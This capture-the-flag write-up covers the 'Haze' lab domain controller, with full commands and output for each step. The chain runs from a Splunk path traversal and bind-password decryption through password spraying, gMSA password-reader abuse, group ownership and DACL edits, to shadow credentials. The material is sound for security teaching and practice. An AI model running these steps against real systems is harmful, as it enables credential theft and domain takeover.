> **Publication note:** Passwords, hashes, flags, and Splunk secrets are redacted. HTB IP may differ per spawn.


Target : 10.129.232.50

Date : 30/06/2026

```bash
>  echo '10.129.232.50 haze.htb dc01.haze.htb' | sudo tee -a /etc/hosts  
  
Please touch the FIDO authenticator.  
10.129.232.50 haze.htb dc01.haze.htb  
>  nmap -sC -sV -O -Pn -p- --min-rate=3000 -T4 10.129.232.50  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-30 21:42 +0200  
Warning: 10.129.232.50 giving up on port because retransmission cap hit (6).  
Nmap scan report for haze.htb (10.129.232.50)  
Host is up (0.059s latency).  
Not shown: 65505 closed tcp ports (reset)  
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Simple DNS Plus  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-01 03:43:25Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=dc01.haze.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb  
| Not valid before: 2025-03-05T07:12:20  
|_Not valid after:  2026-03-05T07:12:20  
|_ssl-date: 2026-07-01T03:44:40+00:00; +8h00m01s from scanner time.  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=dc01.haze.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb  
| Not valid before: 2025-03-05T07:12:20  
|_Not valid after:  2026-03-05T07:12:20  
|_ssl-date: 2026-07-01T03:44:40+00:00; +8h00m01s from scanner time.  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=dc01.haze.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb  
| Not valid before: 2025-03-05T07:12:20  
|_Not valid after:  2026-03-05T07:12:20  
|_ssl-date: 2026-07-01T03:44:39+00:00; +8h00m01s from scanner time.  
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb, Site: Default-First-Site-Name)  
|_ssl-date: 2026-07-01T03:44:40+00:00; +8h00m01s from scanner time.  
| ssl-cert: Subject: commonName=dc01.haze.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb  
| Not valid before: 2025-03-05T07:12:20  
|_Not valid after:  2026-03-05T07:12:20  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
8000/tcp  open  http          Splunkd httpd  
| http-title: Site doesn't have a title (text/html; charset=UTF-8).  
|_Requested resource was http://haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2F  
|_http-server-header: Splunkd  
| http-robots.txt: 1 disallowed entry    
|_/  
8088/tcp  open  ssl/http      Splunkd httpd  
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser  
| Not valid before: 2025-03-05T07:29:08  
|_Not valid after:  2028-03-04T07:29:08  
|_ssl-date: TLS randomness does not represent time  
|_http-title: 404 Not Found  
| http-robots.txt: 1 disallowed entry    
|_/  
|_http-server-header: Splunkd  
8089/tcp  open  ssl/http      Splunkd httpd  
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser  
| Not valid before: 2025-03-05T07:29:08  
|_Not valid after:  2028-03-04T07:29:08  
|_http-title: splunkd  
| http-robots.txt: 1 disallowed entry    
|_/  
|_ssl-date: TLS randomness does not represent time  
|_http-server-header: Splunkd  
9389/tcp  open  mc-nmf        .NET Message Framing  
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
49664/tcp open  msrpc         Microsoft Windows RPC  
49665/tcp open  msrpc         Microsoft Windows RPC  
49666/tcp open  msrpc         Microsoft Windows RPC  
49667/tcp open  msrpc         Microsoft Windows RPC  
49668/tcp open  msrpc         Microsoft Windows RPC  
49674/tcp open  msrpc         Microsoft Windows RPC  
54742/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
54743/tcp open  msrpc         Microsoft Windows RPC  
54747/tcp open  msrpc         Microsoft Windows RPC  
54755/tcp open  msrpc         Microsoft Windows RPC  
54775/tcp open  msrpc         Microsoft Windows RPC  
54778/tcp open  msrpc         Microsoft Windows RPC  
54856/tcp open  msrpc         Microsoft Windows RPC  
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).  
TCP/IP fingerprint:  
OS:SCAN(V=7.99%E=4%D=6/30%OT=53%CT=1%CU=39619%PV=Y%DS=2%DC=I%G=Y%TM=6A441CA  
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=106%TI=I%CI=I%II=I%SS=S%TS=  
OS:A)SEQ(SP=107%GCD=1%ISR=109%TI=I%CI=I%TS=A)SEQ(SP=107%GCD=2%ISR=107%TI=I%  
OS:CI=I%II=I%SS=S%TS=A)SEQ(SP=108%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=A)SE  
OS:Q(SP=108%GCD=2%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M552NW8ST11%O2=M5  
OS:52NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552ST11)WIN(  
OS:W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF  
OS:%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R  
OS:=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%  
OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)  
OS:U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%D  
OS:FI=N%T=80%CD=Z)  
  
Network Distance: 2 hops  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s  
| smb2-time:    
|   date: 2026-07-01T03:44:32  
|_  start_date: N/A  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 105.86 seconds
```

This is an `Active Directory` environment with `DNS 53/tcp, kerberos 88/tcp, msrpc 135/tcp, netBIOS 139/tcp, LDAP 389/tcp, SMB 445/tcp` and also `Splunk 8000/tcp` over `http` and `Splunk httpd on 8088/tcp and 8089/tcp`.

We'll investigate `Splunk` which is a web application for Security Analysts and Threat Intelligence. It is installed on the `DC` and should be treated as a potential gate to exploit.

```bash
>  curl -sk https://dc01.haze.htb:8089/services/server/info\?output_mode\=json  
  
{"messages":[{"type":"ERROR","text":"Unauthorized"}]}%                                                                                                                                                              
>  curl -sk https://dc01.haze.htb:8088/services/server/info\?output_mode\=json  
  
{"text":"The requested URL was not found on this server.","code":404}%                                                                                
```

The path `/services/server/info` exists, but requires auth on port 8089 and doesn't show up on port 8088.

```bash
>  curl -sk https://dc01.haze.htb:8089/ | grep -iE 'version|splunk|generator' | head -10  
  
<?xml version="1.0" encoding="UTF-8"?>  
<feed xmlns="http://www.w3.org/2005/Atom" xmlns:s="http://dev.splunk.com/ns/rest">  
 <title>splunkd</title>  
 <generator build="78803f08aabb" version="9.2.1"/>  
   <name>Splunk</name>
```

We got the version, `9.2.1`.

We'll use `path traversal with \C:..\C:..` for `Windows` and retrieve the configuration file and the secret :

```bash
>  curl -sk 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/system/local/authentication.conf' -o /tmp/haze-authentication.conf  
  
>  cat /tmp/haze-authentication.conf  
[splunk_auth]  
minPasswordLength = 8  
minPasswordUppercase = 0  
minPasswordLowercase = 0  
minPasswordSpecial = 0  
minPasswordDigit = 0  
  
[Haze LDAP Auth]  
SSLEnabled = 0  
anonymous_referrals = 1  
bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb  
bindDNpassword = <REDACTED_$7$_CIPHERTEXT>  
charset = utf8  
emailAttribute = mail  
enableRangeRetrieval = 0  
groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb  
groupMappingAttribute = dn  
groupMemberAttribute = member  
groupNameAttribute = cn  
host = dc01.haze.htb  
nestedGroups = 0  
network_timeout = 20  
pagelimit = -1  
port = 389  
realNameAttribute = cn  
sizelimit = 1000  
timelimit = 15  
userBaseDN = CN=Users,DC=haze,DC=htb  
userNameAttribute = samaccountname  
  
[authentication]  
authSettings = Haze LDAP Auth  
authType = LDAP
>  curl -sk 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/auth/splunk.secret' -o /tmp/splunk.secret  
>  cat /tmp/splunk.secret  
<REDACTED_SPLUNK_SECRET>

```

The `BindDNpassword` from the `.conf` file is `bindDN = CN=Paul Taylor`'s — ciphertext marker `$7$` + base64 blob (`<REDACTED_$7$_CIPHERTEXT>`).
The `$7$ marker` tells `Splunk` to use `Splunk 7.2` for decryption, and the rest is `encrypted binaries` stored safely in the .conf file as `b64` containing `tag + IV + ciphertext`.

```bash
>  echo '<REDACTED_B64_PAYLOAD>' | base64 -d | xxd  
00000000: 9dd9 d888 23e1 7f89 5080 f84f bbb6 33d6  ....#...P..O..3.  
00000010: 9bc6 9bae 8d93 43e9 61c2 cdfa ab75 ab2a  ......C.a....u.*  
00000020: 2383 8414 fa12 ad79 e996 4065 2e4c a0d5  #......y..@e.L..  
00000030: 9566 cef2 96                             .f...


```

So we'll decrypt the `plaintext password` from the `ciphertext` by using `splunk.secret` decryption of ciphertext :

```bash
>  splunksecrets splunk-decrypt --splunk-secret /tmp/splunk.secret --ciphertext '<REDACTED_$7$_CIPHERTEXT>'  
<REDACTED_LDAP_PASSWORD>
```

We try netexec :

```bash
>  nxc smb 10.129.232.50 -u paul.taylor -p '<REDACTED_LDAP_PASSWORD>' -d haze.htb  
  
SMB         10.129.232.50   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB         10.129.232.50   445    DC01             [+] haze.htb\paul.taylor:<REDACTED_LDAP_PASSWORD>    
>  nxc winrm 10.129.232.50 -u paul.taylor -p '<REDACTED_LDAP_PASSWORD>'  
WINRM       10.129.232.50   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)    
WINRM       10.129.232.50   5985   DC01             [-] haze.htb\paul.taylor:<REDACTED_LDAP_PASSWORD>  
>  nxc smb dc01.haze.htb -u paul.taylor -p '<REDACTED_LDAP_PASSWORD>' --rid-brute 2000 | grep SidTypeUser  
  
SMB                      10.129.232.50   445    DC01             500: HAZE\Administrator (SidTypeUser)  
SMB                      10.129.232.50   445    DC01             501: HAZE\Guest (SidTypeUser)  
SMB                      10.129.232.50   445    DC01             502: HAZE\krbtgt (SidTypeUser)  
SMB                      10.129.232.50   445    DC01             1000: HAZE\DC01$ (SidTypeUser)  
SMB                      10.129.232.50   445    DC01             1103: HAZE\paul.taylor (SidTypeUser)  
SMB                      10.129.232.50   445    DC01             1104: HAZE\mark.adams (SidTypeUser)  
SMB                      10.129.232.50   445    DC01             1105: HAZE\edward.martin (SidTypeUser)  
SMB                      10.129.232.50   445    DC01             1106: HAZE\alexander.green (SidTypeUser)  
SMB                      10.129.232.50   445    DC01             1111: HAZE\Haze-IT-Backup$ (SidTypeUser)
```

We got a fine base for a `userslist`.

We'll build a userslist :

```bash
>  cat /tmp/haze.txt  
SMB                      10.129.232.50   445    DC01             500: HAZE\Administrator (SidTypeUser)  
SMB                      10.129.232.50   445    DC01             501: HAZE\Guest (SidTypeUser)  
SMB                      10.129.232.50   445    DC01             502: HAZE\krbtgt (SidTypeUser)  
SMB                      10.129.232.50   445    DC01             1000: HAZE\DC01$ (SidTypeUser)  
SMB                      10.129.232.50   445    DC01             1103: HAZE\paul.taylor (SidTypeUser)  
SMB                      10.129.232.50   445    DC01             1104: HAZE\mark.adams (SidTypeUser)  
SMB                      10.129.232.50   445    DC01             1105: HAZE\edward.martin (SidTypeUser)  
SMB                      10.129.232.50   445    DC01             1106: HAZE\alexander.green (SidTypeUser)  
SMB                      10.129.232.50   445    DC01             1111: HAZE\Haze-IT-Backup$ (SidTypeUser)  
>  awk '$6 ~ /^HAZE\\/ {print $6}' /tmp/haze.txt  
HAZE\Administrator  
HAZE\Guest  
HAZE\krbtgt  
HAZE\DC01$  
HAZE\paul.taylor  
HAZE\mark.adams  
HAZE\edward.martin  
HAZE\alexander.green  
HAZE\Haze-IT-Backup$  
>  awk '{sub(/^HAZE\\/,"",$6); print $6}' /tmp/haze.txt  
Administrator  
Guest  
krbtgt  
DC01$  
paul.taylor  
mark.adams  
edward.martin  
alexander.green  
Haze-IT-Backup$
>  nano /tmp/haze.txt
>  nxc winrm dc01.haze.htb -u /tmp/haze.txt -p '<REDACTED_LDAP_PASSWORD>'  
  
WINRM       10.129.232.50   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)    
WINRM       10.129.232.50   5985   DC01             [-] haze.htb\Administrator:<REDACTED_LDAP_PASSWORD>  
WINRM       10.129.232.50   5985   DC01             [-] haze.htb\Guest:<REDACTED_LDAP_PASSWORD>  
WINRM       10.129.232.50   5985   DC01             [-] haze.htb\krbtgt:<REDACTED_LDAP_PASSWORD>  
WINRM       10.129.232.50   5985   DC01             [-] haze.htb\DC01$:<REDACTED_LDAP_PASSWORD>  
WINRM       10.129.232.50   5985   DC01             [-] haze.htb\paul.taylor:<REDACTED_LDAP_PASSWORD>  
WINRM       10.129.232.50   5985   DC01             [+] haze.htb\mark.adams:<REDACTED_LDAP_PASSWORD> (Pwn3d!)
```

We got a shell on `mark.adams` with the encrypted password, the .conf file specified `Paul Taylor` as well as `userBaseDN = CN=Users,DC=haze,DC=htb` which means it wasn't exclusive to `Paul Taylor`. Now why did the shell work on `mark.adams` ?

```PowerShell
>  evil-winrm -i 10.129.232.50 -u mark.adams -p '<REDACTED_LDAP_PASSWORD>'  
  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\mark.adams\Documents> type C:\Users\mark.adams\Desktop\user.txt  
Cannot find path 'C:\Users\mark.adams\Desktop\user.txt' because it does not exist.  
At line:1 char:1  
+ type C:\Users\mark.adams\Desktop\user.txt  
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
   + CategoryInfo          : ObjectNotFound: (C:\Users\mark.adams\Desktop\user.txt:String) [Get-Content], ItemNotFoundException  
   + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand  
*Evil-WinRM* PS C:\Users\mark.adams\Documents> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State  
============================= ============================== =======  
SeMachineAccountPrivilege     Add workstations to domain     Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  
*Evil-WinRM* PS C:\Users\mark.adams\Documents> whoami /groups  
  
GROUP INFORMATION  
-----------------  
  
Group Name                                  Type             SID                                         Attributes  
=========================================== ================ =========================================== ==================================================  
Everyone                                    Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group  
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users                               Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group  
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group  
HAZE\gMSA_Managers                          Group            S-1-5-21-323145914-28650650-2368316563-1107 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group  
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

Because `whoami /groups` revealed `BUILTIN\Remote Management Users` so he's allowed to use `5985/tcp` which is `WinRM over Microsoft's HTTPAPI`.

We see in our groups that we are part of `gmsa_Managers` or `Group Managed Service Account Managers`.

```PowerShell
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Get-ADServiceAccount -Filter *  
   
  
  
DistinguishedName : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb  
Enabled           : True  
Name              : Haze-IT-Backup  
ObjectClass       : msDS-GroupManagedServiceAccount  
ObjectGUID        : 66f8d593-2f0b-4a56-95b4-01b326c7a780  
SamAccountName    : Haze-IT-Backup$  
SID               : S-1-5-21-323145914-28650650-2368316563-1111  
UserPrincipalName :  
  
  
  
*Evil-WinRM* PS C:\Users\mark.adams\Documents> dir C:\Users  
  
  
   Directory: C:\Users  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
d-----          3/4/2025  11:29 PM                Administrator  
d-----          3/4/2025  11:46 PM                alexander.green  
d-----          3/5/2025   5:49 PM                edward.martin  
d-----          7/1/2026  11:52 AM                mark.adams  
d-r---          3/4/2025  11:00 PM                Public
```

We got `Haze-IT-Backup` as a `Managed Service Account` as well as  `C:\Users`.

We'll investigate further `Haze-IT-Backup` which is a `non-human` user account : it appeared as `Haze-IT-Backup$` when looking for `SidTypeUser`.

```PowerShell
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Get-ADServiceAccount -Identity 'Haze-IT-Backup$' -Properties msDS-ManagedPassword  
  
  
DistinguishedName : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb  
Enabled           : True  
Name              : Haze-IT-Backup  
ObjectClass       : msDS-GroupManagedServiceAccount  
ObjectGUID        : 66f8d593-2f0b-4a56-95b4-01b326c7a780  
SamAccountName    : Haze-IT-Backup$  
SID               : S-1-5-21-323145914-28650650-2368316563-1111  
UserPrincipalName :
```

It is a `gMSA` account which explains the `$` at the end.

```PowerShell
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Get-ADServiceAccount -Identity 'Haze-IT-Backup$' -Properties PrincipalsAllowedToRetrieveManagedPassword, ServicePrincipalNames  
   
  
  
DistinguishedName                          : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb  
Enabled                                    : True  
Name                                       : Haze-IT-Backup  
ObjectClass                                : msDS-GroupManagedServiceAccount  
ObjectGUID                                 : 66f8d593-2f0b-4a56-95b4-01b326c7a780  
PrincipalsAllowedToRetrieveManagedPassword : {CN=Domain Admins,CN=Users,DC=haze,DC=htb}  
SamAccountName                             : Haze-IT-Backup$  
ServicePrincipalNames                      :  
SID                                        : S-1-5-21-323145914-28650650-2368316563-1111  
UserPrincipalName                          :
```

`PrincipalsAllowedToRetrieveManagedPassword : {CN=Domain Admins,CN=Users,DC=haze,DC=htb`

So  only `Domain Admins` are allowed to retrieve the `Managed Password`.

```bash
>  nxc ldap dc01.haze.htb -u mark.adams -p '<REDACTED_LDAP_PASSWORD>' -d haze.htb --gmsa --no-progress  
LDAP        10.129.232.50   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) (signing:None) (channel binding:Never)    
LDAP        10.129.232.50   389    DC01             [+] haze.htb\mark.adams:<REDACTED_LDAP_PASSWORD>    
LDAP        10.129.232.50   389    DC01             [*] Getting GMSA Passwords  
LDAP        10.129.232.50   389    DC01             Account: Haze-IT-Backup$      NTLM: <no read permissions>                PrincipalsAllowedToReadPassword: Domain Admins
```

The `NTLM` is hidden and `Domain Admins` are allowed to read the `NTLM` only.

```PowerShell
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Set-ADServiceAccount -Identity 'Haze-IT-Backup$' `  
 -Server dc01.haze.htb `  
 -PrincipalsAllowedToRetrieveManagedPassword @('mark.adams') `  
 -Verbose  
   
Verbose: Performing the operation "Set" on target "CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb".
```

So we can now read the `NTLM` hash as we added ourselves to the `Principals` allowed to retrieve `Haze-IT-Backup$`' password.

```bash
>  nxc ldap dc01.haze.htb -u mark.adams -p '<REDACTED_LDAP_PASSWORD>' -d haze.htb --port 636 --gmsa --no-progress  
  
LDAPS       10.129.232.50   636    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) (signing:None) (channel binding:Never)    
LDAPS       10.129.232.50   636    DC01             [+] haze.htb\mark.adams:<REDACTED_LDAP_PASSWORD>    
LDAPS       10.129.232.50   636    DC01             [*] Getting GMSA Passwords  
LDAPS       10.129.232.50   636    DC01             Account: Haze-IT-Backup$      NTLM: <GMSA_NTLM_HASH>     PrincipalsAllowedToReadPassword: mark.adams  
LDAPS       10.129.232.50   636    DC01             Account: Haze-IT-Backup$      aes128-cts-hmac-sha1-96: 791854293a546bb450b7f35baf22de54  
LDAPS       10.129.232.50   636    DC01             Account: Haze-IT-Backup$      aes256-cts-hmac-sha1-96: 9f9a656d847d5ae25f6355d47beb5370f97ab01848c6536ebffbe00269cddca5
```

We'll `ntpdate` to skew to the DC :

```bash
>  sudo ntpdate -u 10.129.232.50  
Please touch the FIDO authenticator.  
1 Jul 22:33:52 ntpdate[293482]: step time server 10.129.232.50 offset +28801.664171 sec
```

The hash for `Haze-IT-Backup$` is `<GMSA_NTLM_HASH>` so we'll use `P-t-H` :

```bash
>  mkdir -p /tmp/haze  
> cd /tmp/haze  
  
> getTGT.py 'haze.htb/Haze-IT-Backup$' -hashes ':<GMSA_NTLM_HASH>'  
  
> export KRB5CCNAME="/tmp/haze/Haze-IT-Backup\$.ccache"  
> klist  
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Saving ticket in Haze-IT-Backup$.ccache  
Ticket cache: FILE:/tmp/haze/Haze-IT-Backup$.ccache  
Default principal: Haze-IT-Backup$@HAZE.HTB  
  
Valid starting       Expires              Service principal  
07/01/2026 22:38:15  07/02/2026 08:38:15  krbtgt/HAZE.HTB@HAZE.HTB  
       renew until 07/02/2026 22:38:06
```

Then, we export the database to `Bloodhound Legacy` since `CE` won't load because of `docker` issues :

```bash
> bloodhound-python -u 'Haze-IT-Backup$' -k -no-pass -d haze.htb \  
 -c All -dc dc01.haze.htb -ns 10.129.232.50 --zip  
  
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)  
INFO: Found AD domain: haze.htb  
INFO: Using TGT from cache  
INFO: Found TGT with correct principal in ccache file.  
INFO: Connecting to LDAP server: dc01.haze.htb  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 1 computers  
INFO: Connecting to LDAP server: dc01.haze.htb  
INFO: Found 9 users  
INFO: Found 57 groups  
INFO: Found 2 gpos  
INFO: Found 2 ous  
INFO: Found 20 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: dc01.haze.htb  
INFO: Done in 00M 23S  
INFO: Compressing output into 20260701225458_bloodhound.zip
```

`Haze-IT-Backup$` has `WriteOwner` on `SUPPORT_SERVICES@HAZE.HTB` and `SUPPORT_SERVICES@HAZE.HTB` has `ForceChangePassword` and `AddKeyCredentialLink` to `edward.martin` who is a human user that was in `C:\Users`.

We can make ourselves owners of that group and reset `edward.martin`'s password and access his account.

```bash
>  owneredit.py -target 'Support_Services' -action read \  
 'haze.htb/Haze-IT-Backup$' -dc-ip 10.129.232.50 -k -no-pass  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Current owner information below  
[*] - SID: S-1-5-21-323145914-28650650-2368316563-512  
[*] - sAMAccountName: Domain Admins  
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=haze,DC=htb

>  owneredit.py -target 'Support_Services' 'haze.htb/Haze-IT-Backup$' \  
 -dc-ip 10.129.232.50 -action read -k -no-pass  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Current owner information below  
[*] - SID: S-1-5-21-323145914-28650650-2368316563-1111  
[*] - sAMAccountName: Haze-IT-Backup$  
[*] - distinguishedName: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
```

We changed ownership of the group to us.

```bash
> GMSA_HASH='<GMSA_NTLM_HASH>'  
> getTGT.py 'haze.htb/Haze-IT-Backup$' -hashes ":$GMSA_HASH"  
> export KRB5CCNAME="/tmp/haze/Haze-IT-Backup\$.ccache"  

> dacledit.py -action write -rights WriteMembers \  
 -principal 'Haze-IT-Backup$' \  
 -target-dn 'CN=Support_Services,CN=Users,DC=haze,DC=htb' \  
 -dc-ip 10.129.232.50 \  
 'haze.htb/Haze-IT-Backup$' -k -no-pass  
  
> /usr/bin/bloodyad -d haze.htb -u 'Haze-IT-Backup$' -k -H dc01.haze.htb \  
 add groupMember support_services 'Haze-IT-Backup$'  
  ```

After getting `Write` rights, we get `Shadow Creds` for `edward.martin` :

```bash
> certipy shadow auto \  
 -username 'Haze-IT-Backup$@haze.htb' -hashes ":$GMSA_HASH" \  
 -account edward.martin -target dc01.haze.htb -dc-ip 10.129.232.50  
Certipy v5.1.0 - by Oliver Lyak (ly4k)  
  
[*] Targeting user 'edward.martin'  
[*] Generating certificate  
[*] Certificate generated  
[*] Generating Key Credential  
[*] Key Credential generated with DeviceID '<REDACTED_DEVICE_ID>'  
[*] Adding Key Credential with device ID '<REDACTED_DEVICE_ID>' to the Key Credentials for 'edward.martin'  
[*] Successfully added Key Credential with device ID '<REDACTED_DEVICE_ID>' to the Key Credentials for 'edward.martin'  
[*] Authenticating as 'edward.martin' with the certificate  
[*] Certificate identities:  
[*]     No identities found in this certificate  
[*] Using principal: 'edward.martin@haze.htb'  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saving credential cache to 'edward.martin.ccache'  
[*] Wrote credential cache to 'edward.martin.ccache'  
[*] Trying to retrieve NT hash for 'edward.martin'  
[*] Restoring the old Key Credentials for 'edward.martin'  
[*] Successfully restored the old Key Credentials for 'edward.martin'  
[*] NT hash for 'edward.martin': <EDWARD_NTLM_HASH>
```

```PowerShell
>  evil-winrm -i 10.129.232.50 -u edward.martin -H <EDWARD_NTLM_HASH>  
  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\edward.martin\Documents> type C:\Users\edward.martin\Desktop\user.txt  
<REDACTED_USER_FLAG>
